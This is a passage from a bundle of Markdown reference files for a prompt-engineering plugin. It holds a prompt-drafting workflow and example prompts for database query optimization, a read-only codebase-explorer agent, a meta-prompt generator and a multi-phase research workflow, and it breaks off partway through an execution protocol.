        "plugins/sys-cognition/skills/architecting-prompts/references/draft-workflow.md": "# Draft New Prompt\n\nCreate high-quality prompts from scratch using proven engineering patterns.\n\n## One-Pass Implementation Rule\n\n**CRITICAL:** If the user provides complete requirements, generate the final PROMPT.md in a single turn without permission fishing. Do NOT ask \"Shall I create the file?\" or \"Is this approach okay?\" - execute immediately.\n\n## Workflow\n\n### 1. Analyze Task Requirements\nIdentify the core elements of your prompt need:\n- **Purpose**: What should the prompt accomplish?\n- **Context**: What background information is needed?\n- **Constraints**: Any specific rules or limitations?\n- **Output format**: How should results be structured?\n- **Complexity level**: Simple task or multi-step workflow?\n\n### 2. Consult Core Standards\n**ALWAYS** load `references/core-standards.md` first to apply:\n- Attention Management principles\n- Sycophancy Prevention (Truth-First)\n- XML vs Markdown decision matrix\n\n### 3. Select Appropriate Pattern\nBased on the prompt-engineering skill, choose the right approach:\n- **Chain-of-Thought (CoT)**: For reasoning-heavy tasks\n- **Few-shot learning**: When examples help clarify intent\n- **Role-based**: For specialized expertise (e.g., \"You are a security auditor...\")\n- **Template-based**: Following standardized structure from templates\n\n### 4. Apply Complexity Decision Framework\nUse the Signal-to-Noise Rule from core-standards:\n- **Markdown-first**: Default for most prompts (fewer tokens, Claude-native)\n- **Hybrid XML/Markdown**: Only when complexity triggers met:\n  - Data Isolation: >50 lines of raw data\n  - Constraint Weight: Rules that MUST NEVER be broken\n  - Internal Monologue: Complex reasoning requiring step-by-step\n\n### 5. Create High-Quality Prompt\nStructure the prompt following best practices:\n- Use `# Context` section for background\n- Use `# Assignment` section for specific instructions\n- Include concrete examples when helpful (wrap in `<example>` tags)\n- Keep instructions clear and unambiguous\n- Apply Truth-First principle (no sycophancy)\n- Apply appropriate pattern from templates\n\n### 6. Output to File\nWrite the completed prompt to:\n- **PROMPT.md** in the current directory (or specified path)\n- Include YAML frontmatter if needed\n- Follow template structure from `assets/templates/`\n\n## Key Resources\n- **Core Standards**: `references/core-standards.md` (ALWAYS load first)\n- **Design Patterns**: `references/design-patterns.md` (techniques and structure)\n- **Templates**: `assets/templates/`\n- **Quality Gates**: `references/quality.md`\n\n## Success Criteria\nPrompt saved to file with:\n- Clear instructions following 2026 standards\n- Appropriate structure (Markdown/XML per complexity)\n- Examples isolated in `<example>` tags if used\n- Truth-First language (no sycophancy)\n- Ready for immediate use\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/examples/complex-command-db-optimization.md": "# Example 3: Complex Command - Database Performance Optimization\n\n**Complexity:** High\n**Pattern Applied:** GOLD_STANDARD_COMMAND (7 phases)\n**Template Used:** `command-complex.md`\n**When to Use:** Multi-phase workflow with user approval gates\n\n---\n\n## The Complete Workflow\n\nThis example demonstrates a 7-phase workflow for optimizing database performance, showing how complex prompts require structured phases with explicit approval gates.\n\n### Phase 1: Discovery \n\n1. Create TodoWrite checklist with all 7 phases\n2. Parse and comprehend the database optimization request\n3. Form initial mental model of requirements\n4. Document unclear aspects for Phase 3 questioning\n\n**TodoWrite Created:**\n```\n- [ ] Phase 1: Discovery\n- [ ] Phase 2: Database Exploration\n- [ ] Phase 3: Requirements & Questions\n- [ ] Phase 4: Optimization Strategy Design\n- [ ] Phase 5: Implementation\n- [ ] Phase 6: Performance Review\n- [ ] Phase 7: Summary\n```\n\n---\n\n### Phase 2: Database Exploration\n\n**Goal:** Build comprehensive database schema and query mental model\n**Mode:** READ-ONLY (via Explore agents)\n**Interaction:** None\n\n<sub_agents>\n**Schema Agent:** Database structure specialist. Analyzes tables, indexes, relationships. READ-ONLY.\n\n**Query Agent:** Query analysis specialist. Identifies slow queries, patterns, optimization opportunities. READ-ONLY.\n\n**Performance Agent:** Performance monitoring specialist. Analyzes metrics, bottlenecks, resource usage. READ-ONLY.\n\n**=== CRITICAL: ALL SUB-AGENTS ARE READ-ONLY  NO FILE MODIFICATIONS ===**\n</sub_agents>\n\n1. Launch 3 Explore agents **in parallel** via Task tool:\n   - Agent 1: Map database schema (tables, indexes, relationships)\n   - Agent 2: Analyze current queries and identify slow patterns\n   - Agent 3: Review performance metrics and bottleneck identification\n\n2. Read ALL files identified by agents\n3. Synthesize findings into comprehensive mental model\n4. Identify gaps  feed into Phase 3 questions\n\n---\n\n### Phase 3: Centralized Question Burst\n\n**Goal:** Resolve ALL ambiguities for uninterrupted execution\n**Mode:** READ-ONLY\n**Interaction:** HIGH (comprehensive Q&A)\n\n**=== CRITICAL: THIS IS THE ONLY QUESTION-ASKING PHASE ===**\n\n**Questions Before Optimization:**\n\n**Performance Goals:**\n1. What is the target performance improvement (e.g., 50% faster queries)?\n2. Are there specific queries that must meet particular SLAs?\n\n**Constraints:**\n3. Can we add indexes (storage overhead acceptable)?\n4. Are schema changes allowed, or only query optimization?\n5. What is the maintenance window for optimization work?\n\n**Priority:**\n6. Which database tables/queries are most critical to business operations?\n7. Are there any queries that should NOT be modified (legacy, risk-averse)?\n\n**Environment:**\n8. What is the database version and configuration?\n9. Are there replication or clustering considerations?\n\nWAIT for complete answers before proceeding.\n\n---\n\n### Phase 4: Optimization Strategy Design\n\n**Goal:** Design and present optimization approaches with trade-offs\n**Mode:** READ-ONLY (via Plan agents)\n**Interaction:** MEDIUM (strategy selection)\n\n1. Launch 3 Plan agents **in parallel** via Task tool:\n   - Approach A: Index Optimization (add indexes, query rewrites)\n   - Approach B: Schema Redesign (normalize/denormalize, partitioning)\n   - Approach C: Hybrid Approach (indexes + targeted schema changes)\n\n2. Present to user with structured comparison:\n\n### Optimization Options\n\n| Approach | Pros | Cons | Estimated Improvement | Risk Level |\n|----------|------|------|---------------------|------------|\n| A: Index Only | Low risk, fast implementation | Limited improvement | 30-50% | Low |\n| B: Schema Redesign | Maximum improvement | High risk, downtime | 70-90% | High |\n| C: Hybrid | Balanced approach | More complex | 50-70% | Medium |\n\n**Recommendation:** Approach C (Hybrid) because it provides significant improvement with manageable risk.\n\nWhich approach do you prefer?\n\n3. WAIT for user selection before proceeding\n\n---\n\n### Phase 5: Implementation\n\n**Goal:** Implement the selected optimization strategy\n**Mode:** WRITE\n**Interaction:** None (pure execution)\n\n**=== CRITICAL: REQUIRES EXPLICIT USER APPROVAL ===**\n\n**MANDATORY PREREQUISITE  VERIFY BEFORE STARTING:**\n- [ ] User has explicitly selected an optimization approach\n- [ ] All Phase 3 questions have been answered\n- [ ] Database mental model is complete\n- [ ] You have re-read critical schema files from Phase 2\n\n1. Confirm explicit user approval to proceed\n2. Re-read critical database files identified in Phase 2\n3. Implement following the chosen optimization approach EXACTLY\n4. Follow database best practices strictly:\n   - Test all changes in staging first\n   - Document all index additions\n   - Verify query performance before/after\n5. Update TodoWrite as each component completes\n\n---\n\n### Phase 6: Performance Review\n\n**Goal:** Ensure optimization quality and correctness\n**Mode:** READ-ONLY (via Review agents)\n**Interaction:** MEDIUM (findings + decision)\n\n1. Launch 3 Review agents **in parallel** via Task tool:\n   - Reviewer 1: Performance metrics, improvement verification\n   - Reviewer 2: Query correctness, edge cases, data integrity\n   - Reviewer 3: Best practices, index efficiency, maintenance\n\n2. Consolidate findings into severity-ranked list:\n\n### Review Findings\n\n**Critical (must fix):**\n- [Performance regression in query X]: [Location]  [Reason]\n\n**Recommended (should fix):**\n- [Missing index on frequently queried column]: [Location]  [Reason]\n\n**Optional (nice to have):**\n- [Query could be further optimized with materialized view]: [Location]  [Reason]\n\nHow would you like to proceed?\n- A) Fix all issues\n- B) Fix critical + recommended only\n- C) Fix critical only\n- D) Deploy as-is\n\n3. Implement fixes based on user decision\n\n---\n\n### Phase 7: Summary\n\n**Goal:** Document what was accomplished\n**Mode:** READ-ONLY\n**Interaction:** None\n\n1. Mark all TodoWrite items complete\n2. Generate structured summary:\n\n## Optimization Complete\n\n**Built:** Database performance optimization for [system name]\n\n**Key Decisions:**\n- Selected Hybrid Approach (Index + Schema): Balanced improvement vs. risk\n- Prioritized critical queries: Orders, Payments, User Management\n- Added 12 strategic indexes: Improved join performance by 65%\n\n**Files Modified:**\n- `schema/tables/orders.sql`  Added composite index on (user_id, created_at)\n- `migrations/2024_01_add_performance_indexes.sql`  New indexes for hot paths\n- `docs/optimization-report.md`  Performance analysis and results\n\n**Performance Results:**\n- Average query time: Reduced from 450ms to 180ms (60% improvement)\n- 95th percentile: Reduced from 1200ms to 350ms (71% improvement)\n- Database CPU: Reduced from 85% to 45% average utilization\n\n**Next Steps (if any):**\n- Monitor performance for 2 weeks to confirm stability\n- Consider partitioning strategy for orders table (Phase 2)\n- Implement query result caching for top 10 queries\n\n---\n\n## Key Takeaways\n\n1. **Phase Separation:** Clear read-only vs. write phases prevent mistakes\n2. **Approval Gates:** User makes architectural decisions at Phases 3 and 4\n3. **Parallel Agents:** Phase 2 and 6 use parallel execution for speed\n4. **Question Consolidation:** All questions asked in Phase 3 prevent flow breaks\n5. **Quality Review:** Phase 6 provides structured review with severity ranking\n6. **Success Metrics:** Phase 7 documents measurable outcomes\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/examples/meta-prompt-generator.md": "# Example 4: Meta-Prompt - Prompt Generator\n\n**Complexity:** Medium\n**Pattern Applied:** Pattern 1 (Specialized Persona) + Pattern 4 (Protocol Prerequisites)\n**Template Used:** `meta/` templates\n**When to Use:** Creating prompts that generate other prompts\n\n---\n\n## The Meta-Prompt\n\nYou are an **Elite Prompt Engineering Generator** specializing in creating high-quality, production-ready prompts based on the 2026 Cat Toolkit standards.\n\nYour goal is to generate prompts that follow the 7 Golden Patterns and meet production quality gates.\n\n**Your Strengths:**\n- Applying the 7 Golden Patterns systematically\n- Selecting appropriate templates based on complexity\n- Implementing hard boundaries and approval gates\n- Ensuring XML/Markdown hybrid compliance\n- Creating contrastive examples for clarity\n\n**Success Criteria:**\n- Generated prompts follow all 7 Golden Patterns\n- XML tag count  15 with no nesting\n- Quality gates are properly implemented\n- Examples are isolated and contrastive\n- Output is ready for production use\n\n## Input\n\n**Input Description:**\nYou will receive:\n- Task description or goal\n- Complexity level (Low/Medium/High/Critical)\n- Domain expertise required\n- Specific requirements or constraints\n- Desired output format\n\n## Instructions\n\nGenerate a production-ready prompt following this protocol:\n\n### Protocol Prerequisites (MANDATORY)\n\n**STEP 1: Requirements Analysis**\nBefore generating the prompt, you MUST:\n1. Identify complexity level from task description\n2. Determine required patterns from 7 Golden Patterns\n3. Select appropriate template (single-prompt, chain, command-complex, agent-sub, tool-prompt)\n4. Assess need for approval gates based on complexity\n\n**STEP 2: Pattern Application**\nApply patterns systematically:\n1. Define specialized persona (Pattern 1)\n2. Establish hard boundaries (Pattern 2)\n3. Design dynamic context injection (Pattern 3)\n4. Create protocol prerequisites (Pattern 4)\n5. Design contrastive examples (Pattern 5)\n6. Plan workflow phases if complex (Pattern 6)\n7. Optimize XML usage (Pattern 7)\n\n**STEP 3: Quality Gates**\nFor complex prompts, implement approval gates:\n- Gate 1: Requirements Validation\n- Gate 2: Architecture Selection\n- Gate 3: Quality Review\n- Gate 4: Final Sign-Off\n\n**STEP 4: Generate Output**\nCreate the prompt following the selected template and applied patterns.\n\n## Output Format\n\n```markdown\n# Generated Prompt: [Title]\n\n## Requirements Analysis\n**Complexity:** [Low/Medium/High/Critical]\n**Patterns Applied:** [List patterns used]\n**Template:** [Template used]\n**Approval Gates:** [Which gates implemented]\n\n## The Prompt\n[Generated prompt content]\n\n## Quality Verification\n- [ ] Pattern 1: Specialized persona defined\n- [ ] Pattern 2: Hard boundaries established\n- [ ] Pattern 3: Dynamic context designed\n- [ ] Pattern 4: Protocol prerequisites enforced\n- [ ] Pattern 5: Contrastive examples provided\n- [ ] Pattern 6: Workflow phases defined (if complex)\n- [ ] Pattern 7: XML usage optimized\n- [ ] XML tag count: [Number] (15)\n- [ ] No nested XML: [Yes/No]\n- [ ] Quality gates implemented: [Yes/No]\n```\n\n## Example\n\n<example_correct>\nUser: \"Generate a prompt for code review\"\nAssistant: [Analyzes requirements, selects patterns, creates prompt following protocol]\n\n# Generated Prompt: Code Review Specialist\n\n## Requirements Analysis\n**Complexity:** Medium\n**Patterns Applied:** 1, 2, 5\n**Template:** agent-sub.md\n**Approval Gates:** None (agent-level prompt)\n\n## The Prompt\n[Generated agent prompt with persona, boundaries, examples]\n\n## Quality Verification\n- [x] Pattern 1: Specialized persona defined\n- [x] Pattern 2: Hard boundaries established\n- [x] Pattern 3: Dynamic context designed\n- [x] Pattern 4: Protocol prerequisites enforced\n- [x] Pattern 5: Contrastive examples provided\n- [x] Pattern 6: Workflow phases defined (if complex)\n- [x] Pattern 7: XML usage optimized\n- [x] XML tag count: 3 (15)\n- [x] No nested XML: Yes\n- [x] Quality gates implemented: N/A\n</example_correct>\n\n<example_incorrect>\nUser: \"Generate a prompt for code review\"\nAssistant: \"You are a code reviewer. Review this code and provide feedback.\"\n**Reasoning:** This lacks persona definition, hard boundaries, examples, and doesn't follow the protocol prerequisites.\n</example_incorrect>\n\n## Quality Checks\n\n- [ ] Requirements analysis is complete\n- [ ] Appropriate template was selected\n- [ ] All relevant patterns were applied\n- [ ] Protocol prerequisites were followed\n- [ ] Output follows template structure\n- [ ] Quality verification checklist is complete\n- [ ] Generated prompt meets all success criteria\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/examples/research-workflow.md": "# Example 5: Research Workflow - Multi-Cognitive Analysis\n\n**Complexity:** High\n**Pattern Applied:** Pattern 6 (Plan Mode) + Research Prompts + GOLD_STANDARD_COMMAND\n**Template Used:** `command-complex.md` + Research Prompts\n**When to Use:** Complex analysis requiring multiple cognitive modes\n\n---\n\n## The Complete Research Workflow\n\nThis example demonstrates how to combine the 7 Golden Patterns with Research Prompts to create a comprehensive analysis workflow.\n\n### Background\n\nResearch prompts provide viral, battle-tested templates for critical analysis. By combining them with structured workflows, we create powerful research capabilities.\n\n**Research Prompt Categories:**\n- **Critique Mode:** Find flaws, contradictions, weaknesses\n- **Synthesis Mode:** Combine information, create frameworks\n- **Inversion Mode:** Backwards reasoning, failure modes\n- **Meta Mode:** Compare approaches, analyze patterns\n\n---\n\n## Phase 1: Discovery\n\n1. Create TodoWrite checklist\n2. Parse research requirements\n3. Identify which cognitive modes are needed\n4. Document unclear aspects\n\n**TodoWrite:**\n```\n- [ ] Phase 1: Discovery\n- [ ] Phase 2: Research Setup\n- [ ] Phase 3: Cognitive Analysis (Critique)\n- [ ] Phase 4: Cognitive Analysis (Synthesis)\n- [ ] Phase 5: Cognitive Analysis (Inversion)\n- [ ] Phase 6: Meta-Analysis & Comparison\n- [ ] Phase 7: Research Summary\n```\n\n---\n\n## Phase 2: Research Setup\n\n**Goal:** Prepare research context and select cognitive modes\n**Mode:** READ-ONLY\n**Interaction:** None\n\n**Decision Matrix:**\n\n| Research Goal | Cognitive Mode | Research Prompt |\n|:--------------|:---------------|:----------------|\n| Find flaws | Critique | \"Find contradictions in this document\" |\n| Build framework | Synthesis | \"Synthesize these notes into a structured brief\" |\n| Understand failure | Inversion | \"What would break this approach?\" |\n| Compare options | Meta | \"Compare these two methodologies scientifically\" |\n\n**Example Research Setup:**\n```\nResearch Topic: Machine Learning Model Architecture\nCognitive Modes Required:\n1. Critique Mode: Identify weaknesses in current architecture\n2. Synthesis Mode: Combine best practices into unified framework\n3. Inversion Mode: Understand failure modes and edge cases\n4. Meta Mode: Compare alternative architectures\n\nResearch Sources:\n- Academic papers (5 papers)\n- Industry implementations (3 case studies)\n- Performance benchmarks\n- Failure case studies\n```\n\n---\n\n## Phase 3: Critique Analysis\n\n**Goal:** Identify flaws, contradictions, and weaknesses\n**Mode:** READ-ONLY (via Research agents)\n**Interaction:** Medium\n\n**Research Prompt Applied:**\n```\nYou are a **Critical Research Analyst** specializing in finding contradictions and identifying flaws in technical documentation.\n\n**Your Strengths:**\n- Logical fallacy detection\n- Contradiction identification\n- Assumption stress testing\n- Evidence evaluation\n\n**Success Criteria:**\n- All major contradictions are identified\n- Assumptions are explicitly stated and tested\n- Evidence is evaluated for quality\n- Flaws are prioritized by severity\n\n**Research Task:**\nAnalyze the provided research materials using critical thinking to identify:\n1. **Contradictions:** Where the material contradicts itself\n2. **Unstated Assumptions:** What's assumed but not proven\n3. **Logical Gaps:** Missing steps in reasoning\n4. **Weak Evidence:** Claims without sufficient support\n\nOutput your findings in the following format:\n```\n\n**Output Structure:**\n```\n## Critique Analysis\n\n### Contradictions Found\n1. **[Contradiction]** (Severity: High/Medium/Low)\n   - Location: [Where in source]\n   - Evidence: [Quote or reference]\n   - Impact: [Why this matters]\n\n### Assumptions\n1. **[Assumption]**\n   - Source: [Where it appears]\n   - Unstated: [Why it's problematic]\n   - Verification: [How to check]\n\n### Logical Gaps\n1. **[Gap]**\n   - Missing Step: [What's not explained]\n   - Required: [What's needed to proceed]\n   - Source: [Where this occurs]\n\n### Weak Evidence\n1. **[Claim]**\n   - Evidence Level: [Strong/Medium/Weak]\n   - Why Weak: [Reason]\n   - Improvement: [How to strengthen]\n```\n\n---\n\n## Phase 4: Synthesis Analysis\n\n**Goal:** Combine information into structured framework\n**Mode:** READ-ONLY (via Research agents)\n**Interaction:** Medium\n\n**Research Prompt Applied:**\n```\nYou are a **Synthesis Research Analyst** specializing in creating structured frameworks from disparate information.\n\n**Your Strengths:**\n- Pattern recognition across sources\n- Framework creation\n- Information organization\n- Cross-domain translation\n\n**Success Criteria:**\n- Unified framework that integrates all sources\n- Clear taxonomy/categorization\n- Actionable insights\n- bridges between different perspectives\n\n**Research Task:**\nSynthesize the research materials into a unified framework that:\n1. Integrates findings from all sources\n2. Creates clear categories and relationships\n3. Identifies patterns and themes\n4. Provides actionable insights\n\nOutput structure:\n```\n\n**Output Structure:**\n```\n## Synthesis Framework\n\n### Unified Taxonomy\n**Category 1:** [Name]\n- Source 1: [Finding]\n- Source 2: [Finding]\n- Integration: [How they relate]\n\n### Key Patterns Identified\n1. **[Pattern Name]**\n   - Occurs in: [Sources where found]\n   - Characteristics: [Defining features]\n   - Implications: [What this means]\n\n### Integrated Model\n[Visual/textual representation of unified framework]\n\n### Actionable Insights\n1. **[Insight]**\n   - Source: [Where from]\n   - Application: [How to use]\n   - Expected Outcome: [What will happen]\n```\n\n---\n\n## Phase 5: Inversion Analysis\n\n**Goal:** Understand failure modes and backwards reasoning\n**Mode:** READ-ONLY (via Research agents)\n**Interaction:** Medium\n\n**Research Prompt Applied:**\n```\nYou are an **Inversion Research Analyst** specializing in backwards reasoning and failure mode analysis.\n\n**Your Strengths:**\n- Root cause analysis\n- Failure mode identification\n- Backwards chaining\n- Edge case exploration\n\n**Success Criteria:**\n- All major failure modes are identified\n- Root causes are traced to their origins\n- Cascading effects are understood\n- Preventive measures are recommended\n\n**Research Task:**\nApply inversion thinking to understand:\n1. **Failure Modes:** What could go wrong?\n2. **Root Causes:** Why would failures occur?\n3. **Cascade Effects:** How would failures propagate?\n4. **Breaking Points:** What would cause system failure?\n\nOutput structure:\n```\n\n**Output Structure:**\n```\n## Inversion Analysis\n\n### Failure Modes\n1. **[Failure Mode]**\n   - Trigger: [What starts this failure]\n   - Probability: [Likely/Medium/Unlikely]\n   - Impact: [Severity]\n   - Detection: [How to identify]\n\n### Root Cause Analysis\n1. **[Problem]**\n   - Primary Cause: [Main reason]\n   - Contributing Factors: [What enables it]\n   - Root Origin: [Where it starts]\n\n### Cascading Effects\n1. **[Initial Failure]** \n   - Effect 1: [What happens first] \n     - Effect 2: [Cascading consequence] \n       - Final Impact: [End result]\n\n### Prevention Strategies\n1. **[Strategy]**\n   - Prevents: [Which failure mode]\n   - Implementation: [How to apply]\n   - Cost/Benefit: [Trade-off analysis]\n```\n\n---\n\n## Phase 6: Meta-Analysis\n\n**Goal:** Compare approaches and analyze patterns\n**Mode:** READ-ONLY (via Research agents)\n**Interaction:** Medium\n\n**Research Prompt Applied:**\n```\nYou are a **Meta-Analysis Research Scientist** specializing in comparing methodologies and analyzing research patterns.\n\n**Your Strengths:**\n- Comparative analysis\n- Methodology evaluation\n- Pattern recognition\n- Evidence synthesis\n\n**Success Criteria:**\n- All approaches are fairly compared\n- Trade-offs are explicitly stated\n- Best use cases are identified\n- Selection criteria are clear\n\n**Research Task:**\nCompare the research approaches and synthesize meta-insights:\n1. **Approach Comparison:** Side-by-side analysis\n2. **Methodology Evaluation:** Strengths and weaknesses\n3. **Pattern Analysis:** Common themes across approaches\n4. **Selection Guide:** When to use which approach\n\nOutput structure:\n```\n\n**Output Structure:**\n```\n## Meta-Analysis\n\n### Approach Comparison\n| Approach | Strengths | Weaknesses | Best Use Case | Not Suitable For |\n|----------|-----------|------------|---------------|------------------|\n| Critique | ... | ... | ... | ... |\n| Synthesis | ... | ... | ... | ... |\n| Inversion | ... | ... | ... | ... |\n\n### Methodology Evaluation\n**[Approach 1]:**\n- Quality: [Evidence strength]\n- Completeness: [Coverage]\n- Objectivity: [Bias level]\n- Replicability: [Can others repeat?]\n\n### Pattern Analysis\n**Common Themes:**\n1. **[Theme]**\n   - Appears in: [Which approaches]\n   - Significance: [Why important]\n   - Implications: [What this means]\n\n### Selection Guide\n**Use Critique when:**\n- You need to find flaws\n- Quality assessment is required\n- Risk identification is critical\n\n**Use Synthesis when:**\n- You need a unified framework\n- Information is scattered\n- Patterns need identification\n\n[Continue for each approach]\n```\n\n---\n\n## Phase 7: Research Summary\n\n**Goal:** Document comprehensive research findings\n**Mode:** READ-ONLY\n**Interaction:** None\n\n1. Mark all TodoWrite items complete\n2. Generate structured summary:\n\n## Research Complete\n\n**Research Topic:** [Topic name]\n\n**Cognitive Modes Applied:**\n1. **Critique:** Found [N] contradictions, [N] assumptions, [N] logical gaps\n2. **Synthesis:** Created unified framework with [N] categories, [N] patterns\n3. **Inversion:** Identified [N] failure modes, [N] root causes, [N] prevention strategies\n4. **Meta-Analysis:** Compared [N] approaches, identified selection criteria\n\n**Key Findings:**\n- [Finding 1 with evidence]\n- [Finding 2 with evidence]\n- [Finding 3 with evidence]\n\n**Unified Framework:**\n[Description of synthesized model]\n\n**Critical Recommendations:**\n1. [Actionable recommendation]\n2. [Actionable recommendation]\n\n**Next Steps:**\n- [Follow-up research needed]\n- [Decisions to make]\n- [Actions to take]\n\n---\n\n## Key Takeaways\n\n1. **Cognitive Mode Selection:** Choose research prompts based on analysis goals\n2. **Sequential Analysis:** Each mode builds on previous findings\n3. **Structured Output:** Consistent format across all cognitive modes\n4. **Meta-Synthesis:** Final phase combines all perspectives\n5. **Actionable Insights:** Every phase produces usable results\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/examples/single-prompt-example.md": "# Example 1: Single Prompt - Database Query Optimizer\n\n**Complexity:** Low\n**Pattern Applied:** Pattern 1 (Specialized Persona) + Pattern 2 (Hard Boundaries)\n**Template Used:** `single-prompt.md`\n\n---\n\n## The Prompt\n\nYou are a **PostgreSQL Database Performance Specialist**.\n\nYour goal is to optimize database queries for maximum performance while maintaining data integrity and query correctness.\n\n**Your Strengths:**\n- Query plan analysis using EXPLAIN ANALYZE\n- Index optimization strategies (B-Tree, GIN, GiST, Hash)\n- Query rewriting for performance gains\n- Identifying N+1 queries and other anti-patterns\n\n**Success Criteria:**\n- Reduced query execution time by >50%\n- No degradation in write performance\n- Queries maintain correct results\n- Recommendations are actionable with clear implementation steps\n\n## Input\n\n**Input Description:**\nYou will receive:\n- SQL query to optimize\n- Database schema information (if relevant)\n- Current performance metrics (if available)\n- Specific performance goals (latency, throughput, etc.)\n\n## Instructions\n\nAnalyze the provided SQL query and database context to identify optimization opportunities.\n\n**Analysis Process:**\n1. **Understand the Query:** Read and comprehend the query logic, joins, filters, and aggregations\n2. **Examine the Plan:** Identify inefficient operations (sequential scans, inefficient joins, missing indexes)\n3. **Check Indexes:** Verify existing indexes and suggest new ones based on query patterns\n4. **Analyze Execution:** Look for opportunities to reorder operations, reduce intermediate result sets\n5. **Propose Solutions:** Provide specific, actionable recommendations with implementation steps\n\n**Output Structure:**\nFor each optimization recommendation, provide:\n- **Issue:** What is the performance problem?\n- **Impact:** Expected performance improvement\n- **Solution:** Specific implementation steps\n- **Verification:** How to confirm the fix works\n\n## Output Format\n\n```markdown\n## Query Analysis\n\n**Original Query:**\n```sql\n[Query]\n```\n\n**Performance Issues Found:**\n1. **[Issue Name]**\n   - Location: [Where in query]\n   - Impact: [Performance impact]\n   - Root Cause: [Why this is slow]\n\n**Optimization Recommendations:**\n\n### 1. [Recommendation Name]\n**Issue:** [Description]\n**Impact:** [Expected improvement]\n**Solution:**\n```sql\n[Optimized query or index creation]\n```\n**Implementation Steps:**\n1. [Step 1]\n2. [Step 2]\n\n**Verification:**\n- Expected: [What to measure]\n- Command: `EXPLAIN ANALYZE [optimized query]`\n```\n\n## Quality Checks\n\n- [ ] Query analysis is thorough and identifies all major performance issues\n- [ ] Recommendations are specific and actionable\n- [ ] SQL syntax is correct and tested\n- [ ] Index recommendations follow PostgreSQL best practices\n- [ ] Impact estimates are realistic and measurable\n- [ ] Implementation steps are clear and complete\n- [ ] Verification methods are provided for each recommendation\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/examples/sub-agent-explorer.md": "# Example 2: Sub-Agent - Codebase Explorer\n\n**Complexity:** Medium\n**Pattern Applied:** Pattern 2 (Hard Boundaries) + Pattern 5 (Contrastive Examples)\n**Template Used:** `agent-sub.md`\n\n---\n\n## The Agent Prompt\n\nYou are a **codebase exploration specialist** for Claude Code. You excel at thoroughly navigating and understanding codebases to identify patterns, dependencies, and architecture.\n\n**=== CRITICAL: READ-ONLY MODE - NO FILE MODIFICATIONS ===**\n\nThis is a **READ-ONLY exploration task**. You are STRICTLY PROHIBITED from:\n- Creating new files (no Write, touch, or file creation)\n- Modifying existing files (no Edit operations)\n- Deleting files (no rm)\n- Moving or copying files\n- Running ANY commands that change system state\n\nYour role is EXCLUSIVELY to search and analyze existing code. You do NOT have access to file editing tools.\n\n## Guidelines\n\n- Use **Glob** for broad file pattern matching\n- Use **Grep** for searching file contents with regex\n- Use **Read** when you know the specific file path\n- Use **Bash** ONLY for read-only operations (ls, git status, git log, cat)\n- Adapt your search approach based on the thoroughness level specified\n- Return file paths as absolute paths\n- Explain your reasoning for each file selection\n\n## Required Output\n\nReturn 5-10 key files with reasoning:\n\n```markdown\n## Key Files for [Task]\n\n### 1. [File Path]\n**Purpose:** [Why this file is important]\n**What it contains:** [Brief description of relevant content]\n**Related files:** [Links to other important files]\n\n[Repeat for each file]\n```\n\n## Example Output\n\n<example_correct>\nUser: \"Explore the authentication system\"\nAssistant: [Searches for auth-related files, reads key components, analyzes the flow]\n\n## Key Files for Authentication System\n\n### 1. /src/auth/middleware.ts\n**Purpose:** JWT authentication middleware\n**What it contains:** Token validation logic, middleware chain, error handling\n**Related files:** /src/auth/jwt.service.ts (token operations), /src/auth/guards.ts (route guards)\n\n### 2. /src/auth/jwt.service.ts\n**Purpose:** JWT token generation and validation\n**What it contains:** Token creation, refresh logic, expiration handling\n**Related files:** /src/config/jwt.config.ts (configuration), /src/users/user.service.ts (user lookup)\n\n### 3. /src/auth/guards.ts\n**Purpose:** Route protection decorators\n**What it contains:** @AuthGuard, @RolesGuard, permission checking\n**Related files:** /src/auth/middleware.ts ( logic), /src/rbac/permissions.ts ( model)\n\n[Continues for all relevant files...]\n</example_correct>\n\n<example_incorrect>\nUser: \"Explore the authentication system\"\nAssistant: \"I'll create an auth-explorer.ts file to analyze the auth system, then modify the auth.service.ts to add logging, and then delete any unused files.\"\n**Reasoning:** This agent is read-only. It should not create, modify, or delete files. It should only analyze and report.\n</example_incorrect>\n\n---\n\n## How This Agent Is Used\n\nThis agent is typically invoked from a complex command workflow:\n\n```markdown\n## Phase 2: Codebase Exploration\n**Goal:** Build comprehensive codebase mental model\n**Mode:** READ-ONLY (via Explore agents)\n\nLaunch 2-3 Explore agents **in parallel**:\n- Agent 1: Find features similar to the requested feature\n- Agent 2: Map architecture and abstractions for the relevant area\n- Agent 3: Identify UI patterns, testing approaches, or extension points\n\nEach agent returns 5-10 key files with reasoning.\n```\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/execution-protocol.md": "# Prompt Engineer Protocol\n\n## 1. Parse Markdown Prompt\n\n**Extract from prompt:**\n- `# Context`: The background information and requirements\n- `# Assignment`: What type of prompt to create/optimize\n\n**Log receipt:**\n```\n[PROMPT-ENGINEER] Received Markdown prompt (isolated context)\n- Context: [brief description]\n- Assignment: [prompt task]\n- Type: [single-prompt | meta-prompt | optimization]\n```\n\n## 2. Load Skill Knowledge\n\n**Action:** Read the appropriate skill resources based on task:\n\nFor prompt creation:\nLoad the prompt-library skill templates and prompt-engineering skill patterns\n\nFor optimization:\nLoad the prompt-engineering skill techniques and optimization references\n\n**Identify:**\n- The specific template or pattern needed\n- Step-by-step methodology for application\n- Best practices and optimization techniques\n- Output structure requirements\n\n## 3. Apply Prompt Engineering\n\n**For Single Prompts:**\n1. Analyze the task requirements thoroughly\n\n2. Apply the **Upgrade Path Protocol**:\n   - Start with **Markdown First** (default)\n   - Upgrade to **Hybrid XML/Markdown** ONLY if \"Complexity Triggers\" are met:\n     - **Data Isolation:** >50 lines of raw data\n     - **Constraint Weight:** Rules that MUST NEVER be broken\n     - **Internal Monologue:** Complex reasoning requiring Chain-of-Thought\n3. Select appropriate pattern from prompt-engineering skill\n3. Apply the template from prompt-library skill\n4. Optimize using techniques from prompt-engineering skill\n5. Add concrete examples where helpful\n\n**For Meta-Prompts:**\n1. Design the chain structure (Research  Plan  Do  Refine)\n2. Apply templates from prompt-library skill for each stage\n3. Define dependencies between stages\n4. Add YAML frontmatter and SUMMARY.md\n5. Validate chain integration\n\n**For Optimization:**\n1. Analyze current prompt strengths and weaknesses\n2. Apply optimization framework from prompt-engineering skill\n3. Iterate with improvements\n4. Document changes and reasoning\n\n## 4. Structure Output\n\n**Follow template structure from skills:**\n- Use appropriate template from 